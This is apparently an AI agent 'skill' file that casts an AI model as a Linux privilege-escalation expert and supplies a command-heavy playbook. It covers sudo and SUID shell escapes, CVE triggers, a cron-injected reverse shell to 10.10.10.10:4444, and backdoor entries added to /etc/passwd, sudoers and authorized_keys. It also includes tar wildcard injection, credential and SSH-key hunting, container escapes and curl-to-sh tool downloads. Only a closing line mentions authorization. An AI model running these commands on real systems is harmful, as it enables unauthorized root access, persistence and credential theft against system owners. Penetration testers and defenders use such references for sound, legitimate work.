---
name: escalating-linux-privileges
description: Escalate privileges on Linux systems using SUID/SGID binaries, capabilities, sudo misconfigurations, cron jobs, kernel exploits, and container escapes. Use when performing Linux post-exploitation or privilege escalation.
---

# Linux Privilege Escalation Skill

You are a Linux security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:

- Escalating privileges on Linux systems
- Identifying misconfigurations and vulnerabilities
- Exploiting SUID/SGID binaries
- Abusing Linux capabilities
- Kernel exploitation
- Container escape techniques
- Sudo misconfigurations and bypasses
- Cron job exploitation
- Path hijacking attacks

## Core Methodologies

### 1. Initial System Enumeration

**System Information:**
```bash
# OS and kernel version
cat /proc/version
uname -a
lsb_release -a
cat /etc/os-release

# Check for kernel exploits
searchsploit "Linux Kernel $(uname -r)"
uname -r

# CPU and system stats
lscpu
cat /proc/cpuinfo
df -h
```

**Current User Context:**
```bash
# Who am I?
id
whoami
groups
sudo -l

# Environment variables (passwords, API keys?)
env
set
cat /proc/self/environ | tr '\0' '\n'

# Check PATH for hijacking opportunities
echo $PATH
```

**Users and Groups:**
```bash
# All users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1

# Users with bash
cat /etc/passwd | grep "/bin/bash"

# User details
cat /etc/shadow  # If readable
cat /etc/group

# Home directories
ls -la /home/
```

### 2. Sudo Exploitation

**Check Sudo Permissions:**
```bash
# What can I run as root?
sudo -l

# Check sudo version for known vulns
sudo -V
sudo --version
```

**Common Sudo Misconfigurations:**
```bash
# NOPASSWD entries
sudo -l | grep NOPASSWD

# Wildcards exploitation
# If: (root) NOPASSWD: /bin/cp /tmp/* /var/www/html/
# Then: Create malicious file in /tmp, overwrite system files

# Shell escapes from sudo
# If you can run vim, less, more, man, etc. with sudo:
sudo vim -c ':!/bin/bash'
sudo less /etc/profile  # then !/bin/bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find . -exec /bin/bash \; -quit
sudo nmap --interactive  # then !bash
```

**Sudo CVEs:**
```bash
# CVE-2021-3156 (Baron Samedit) - Sudo < 1.9.5p2
sudoedit -s /
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# CVE-2019-14287 - Sudo < 1.8.28
# If: (ALL, !root) /bin/bash
sudo -u#-1 /bin/bash

# CVE-2019-18634 - Sudo pwfeedback
# Exploitable if pwfeedback is enabled in /etc/sudoers
```

**GTFOBins for Sudo:**
```bash
# Check https://gtfobins.github.io/ for specific binary
# Examples:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo git -p help  # then !/bin/bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 3. SUID/SGID Binaries

**Find SUID/SGID Files:**
```bash
# Find SUID binaries (4000)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries (2000)
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# Interesting locations
find /usr/local/bin -perm -4000 2>/dev/null
find /usr/bin -perm -4000 2>/dev/null
find /bin -perm -4000 2>/dev/null
```

**Exploiting SUID Binaries:**
```bash
# Check GTFOBins for each SUID binary found
# https://gtfobins.github.io/

# Common exploitable SUID binaries:

# /usr/bin/find
find . -exec /bin/bash -p \; -quit

# /usr/bin/vim
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'

# /usr/bin/nmap (old versions)
nmap --interactive
!sh

# /usr/bin/less
less /etc/profile
!/bin/bash

# /usr/bin/awk
awk 'BEGIN {system("/bin/bash -p")}'

# /usr/bin/perl
perl -e 'exec "/bin/bash";'

# /usr/bin/python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# /usr/bin/php
php -r "pcntl_exec('/bin/bash', ['-p']);"

# Custom SUID binary (check for command injection, buffer overflow)
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary
```

### 4. Linux Capabilities

**What Are Capabilities:**
Capabilities divide root privileges into distinct units. A binary with specific capabilities can perform privileged operations without full root.

**Enumerate Capabilities:**
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3.8

# Check process capabilities
cat /proc/self/status | grep Cap
getpcaps $$

# Decode capability value
capsh --decode=0000003fffffffff
```

**Exploitable Capabilities:**
```bash
# cap_setuid - allows changing UID
# Python with cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search - bypass file read permission checks
# tar with cap_dac_read_search
tar cvf shadow.tar /etc/shadow
tar -xvf shadow.tar

# cap_chown - change file ownership
# Python with cap_chown
python -c 'import os; os.chown("/etc/shadow",1000,1000)'

# cap_sys_admin - various admin operations (often container escape)
# Can mount filesystems, load kernel modules, etc.

# cap_sys_ptrace - inject code into processes
# gdb with cap_sys_ptrace
gdb -p <PID>
call system("id")

# cap_sys_module - load kernel modules
# Can load malicious kernel module for root

# cap_net_raw + cap_net_admin - network packet manipulation
# tcpdump with these caps can be used for ARP spoofing
```

### 5. Cron Jobs Exploitation

**Enumerate Cron Jobs:**
```bash
# System-wide cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# User crontabs
crontab -l
crontab -l -u username

# Check for running cron
ps aux | grep cron
systemctl status cron
```

**Exploiting Writable Cron Scripts:**
```bash
# If a cron script is writable
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron/script.sh
# Wait for cron to execute
/tmp/rootbash -p

# Reverse shell payload
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /path/to/cron/script.sh
```

**PATH Exploitation in Cron:**
```bash
# If cron uses relative paths without full path
# Example: /etc/crontab contains: * * * * * root backup.sh
# Create malicious backup.sh in /tmp/ and modify PATH
echo '/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"' > /tmp/backup.sh
chmod +x /tmp/backup.sh
```

**Wildcards in Cron:**
```bash
# If cron job has: tar czf /backup/backup.tar.gz *
# Create malicious files
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > exploit.sh
chmod +x exploit.sh
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=exploit.sh
# When tar runs with wildcard, it executes exploit.sh
```

### 6. Writable Files and Directories

**Find Writable Files:**
```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v "/proc/"
find / -perm -2 -type f 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null
find / -group $(groups | cut -d' ' -f1) 2>/dev/null

# Writable /etc/ files (critical)
find /etc -writable -type f 2>/dev/null
```

**Critical Writable Files:**
```bash
# /etc/passwd - add root user
echo 'newroot::0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

# /etc/shadow - overwrite root hash
# Generate hash: openssl passwd -6 password
# Replace root line

# /etc/sudoers - add sudo permission
echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# /etc/crontab - add malicious cron
echo '* * * * * root /tmp/exploit.sh' >> /etc/crontab

# ~/.ssh/authorized_keys - add SSH key
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
```

### 7. Kernel Exploits

**Identify Kernel Version:**
```bash
uname -a
cat /proc/version
uname -r
```

**Search for Exploits:**
```bash
# SearchSploit
searchsploit "Linux Kernel $(uname -r | cut -d'-' -f1)"
searchsploit "Linux Kernel 4.4"

# Google search
# Search: "Linux kernel X.X.X exploit"
# Search: "Linux kernel X.X.X privilege escalation"

# Automated tools
linux-exploit-suggester.sh
linux-exploit-suggester-2.pl
```

**Common Kernel Exploits:**
```bash
# DirtyCow (CVE-2016-5195) - Kernel <= 3.19.0-73.8
# https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

# CVE-2022-0847 (Dirty Pipe) - Kernel 5.8 - 5.16.11
# Overwrite read-only files

# CVE-2021-4034 (PwnKit) - PolicyKit
# Local privilege escalation via pkexec

# CVE-2021-3156 (Baron Samedit) - Sudo < 1.9.5p2

# Compile and run
gcc -pthread exploit.c -o exploit -lcrypt
./exploit
```

**Kernel Exploit Resources:**
- https://github.com/lucyoa/kernel-exploits
- https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/bwbwbwbw/linux-exploit-binaries

### 8. Container Escape

**Detect if in Container:**
```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker
cat /proc/self/cgroup

# Check for container-specific files
ls -la /.containerenv  # Podman
cat /proc/1/environ | grep container
```

**Container Escape Techniques:**
```bash
# Privileged container with access to /dev
# Mount host filesystem
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Docker socket mounted (/var/run/docker.sock)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Cap_sys_admin capability
# Can mount host filesystem or abuse other admin functions

# containerd/runc escape (CVE-2019-5736)
# Overwrite runc binary on host

# Kubernetes pod escape
# Service account tokens: /run/secrets/kubernetes.io/serviceaccount/
kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
```

### 9. Password Hunting

**Search for Passwords:**
```bash
# Grep for password strings
grep -r "password" /home/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
grep -ir "pwd\|pass" /opt/ 2>/dev/null

# Configuration files
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.ssh/id_rsa

# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Check environment
env | grep -i pass

# Check for credentials in scripts
find / -name "*.sh" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.py" -exec grep -l "password" {} \; 2>/dev/null

# Memory dumps
strings /dev/mem
strings /proc/kcore

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

### 10. NFS Exploits

**Check NFS Shares:**
```bash
# On target
cat /etc/exports
showmount -e localhost

# From attacker machine
showmount -e 10.10.10.10

# Common misconfig: no_root_squash
# /home *(rw,no_root_squash)
```

**Exploit no_root_squash:**
```bash
# On attacker (as root)
mkdir /tmp/nfs
mount -t nfs 10.10.10.10:/home /tmp/nfs
cd /tmp/nfs

# Create SUID binary
cp /bin/bash .
chmod +s bash

# On target
cd /home
./bash -p  # root shell
```

## Automated Enumeration Tools

**LinPEAS (Recommended):**
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or locally
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**LinEnum:**
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

**Linux Smart Enumeration (LSE):**
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l1  # Level 1 (fast)
./lse.sh -l2  # Level 2 (thorough)
```

**pspy (Monitor Processes):**
```bash
# Monitor for cron jobs and processes without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

## Troubleshooting

**Exploit Not Working:**
- Check architecture: `uname -m` (x86_64, i686, arm, etc.)
- Compile on target system if possible
- Check kernel version exactly matches exploit requirements
- Verify exploit is for correct Linux distribution
- Check for security mitigations (AppArmor, SELinux, ASLR)

**SUID Binary Not Spawning Root Shell:**
- Use `-p` flag to preserve privileges: `/bin/bash -p`
- Some shells drop privileges; try different shells
- Check if binary has capabilities instead of SUID

**Cannot Compile Exploit:**
- Transfer pre-compiled binary
- Cross-compile on attacker machine
- Use statically compiled binaries
- Check for gcc, g++, make on target

**Permission Denied Errors:**
- Check file permissions carefully
- Verify you're in correct group
- Check AppArmor/SELinux is not blocking
- Try different attack vector

## Reference Links

- HackTricks Linux Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/linux-hardening/privilege-escalation
- GTFOBins: https://gtfobins.github.io/
- PEASS-ng (LinPEAS): https://github.com/carlospolop/PEASS-ng
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Linux Privilege Escalation Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

## When to Use This Skill

Activate this skill when the user asks to:
- Escalate privileges on a Linux system
- Enumerate Linux privilege escalation vectors
- Exploit SUID binaries or capabilities
- Abuse sudo misconfigurations
- Escape from containers
- Identify kernel exploits
- Find and exploit cron job weaknesses
- Analyze Linux security misconfigurations

Always ensure proper authorization before performing privilege escalation on any system.
